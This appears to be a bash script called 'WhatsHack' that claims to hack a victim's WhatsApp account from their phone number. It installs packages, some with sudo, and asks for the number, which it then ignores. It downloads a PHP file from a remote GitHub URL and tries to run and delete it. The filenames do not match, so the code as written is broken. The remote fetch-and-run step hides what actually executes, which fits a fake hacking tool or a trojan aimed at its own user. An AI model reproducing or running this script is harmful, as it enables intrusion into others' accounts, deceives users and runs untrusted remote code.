#!/bin/bash


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\e[1;32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" RESETCOLOR="$(printf '\e[0m')"

DL="https://raw.githubusercontent.com/pikashow75/php/main/whitehat.php"




banner() {
	cat <<- EOF 
	${BLUE} ██       ██ ██                  ██           ██      ██                   ██    
	${BLUE}░██      ░██░██                 ░██          ░██     ░██                  ░██    
	${BLUE}░██   █  ░██░██       ██████   ██████  ██████░██     ░██  ██████    █████ ░██  ██
	${BLUE}░██  ███ ░██░██████  ░░░░░░██ ░░░██░  ██░░░░ ░██████████ ░░░░░░██  ██░░░██░██ ██ 
	${BLUE}░██ ██░██░██░██░░░██  ███████   ░██  ░░█████ ░██░░░░░░██  ███████ ░██  ░░ ░████  
	${BLUE}░████ ░░████░██  ░██ ██░░░░██   ░██   ░░░░░██░██     ░██ ██░░░░██ ░██   ██░██░██ 
	${BLUE}░██░   ░░░██░██  ░██░░████████  ░░██  ██████ ░██     ░██░░████████░░█████ ░██░░██
	${BLUE}░░       ░░ ░░   ░░  ░░░░░░░░    ░░  ░░░░░░  ░░      ░░  ░░░░░░░░  ░░░░░  ░░  ░░ ${RED} V1.1

	${GREEN}                     [${WHITE}-${GREEN}]${CYAN} Tool Created by Bot-Tech ${WHITE}
EOF
}

start() {
	{ clear; banner; echo; }

echo " 		WhatsHack tool made for hacking Whatsapp,"
echo ""
echo " 		This tool use as educational perpose only. " 
echo""
echo -e "${GREENBG}Start hacking........${RESETBG}"
echo ""
}

content() {

	read -p "${BLUE} [${GREEN}*${BLUE}]${GREEN} Enter Victims Mobile Number :- ${BLUE}" NUM
	echo ""
	sleep 2
	if [ -z "$NUM" ]
then
	echo "${BLUE} [${GREEN}*${BLUE}]${GREEN}Mobile Number Is Empty"
	echo ""
	sleep 1
	echo "${BLUE} [${GREEN}*${BLUE}]${GREEN}Sorry"
	echo "${RESETCOLOR}"
    exit 

fi

    curl -s $DL > .output.php

}


dependencies() {
	echo -e "\n${GREEN} [${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    
	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ RESETCOLOR; exit 1; }
				fi
			}
		done
	fi

}
php_run() {
	sleep 2
	echo -e "${BLUE} [${GREEN}*${BLUE}]${MAGENTA} Processing details...."
	sleep 3
	echo ""
	echo -e "${BLUE} [${GREEN}*${BLUE}]${RED}Waiting For Victim..... ctrl + c"
	php whitehat.php > /dev/null
	sleep 1
	rm whitehat.php
	echo ""


}

dependencies
start
content
php_run
echo -e "${RESETCOLOR}"
